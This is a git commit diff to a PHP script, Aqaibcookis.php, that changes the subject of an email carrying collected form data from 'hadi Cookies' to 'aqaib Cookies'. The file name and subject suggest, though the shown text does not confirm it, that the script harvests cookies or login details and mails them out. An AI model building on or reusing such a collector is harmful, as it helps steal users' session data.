61e77557a2220f0c212e9b410887584510876a03
maolpase721 <maolpase@gmail.com>
2025-09-01 15:18:22 +0500

    Update Aqaibcookis.php

--- Aqaibcookis.php
+++ Aqaibcookis.php
@@ -45,7 +45,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'hadi Cookies';
+        $mail->Subject = 'aqaib Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
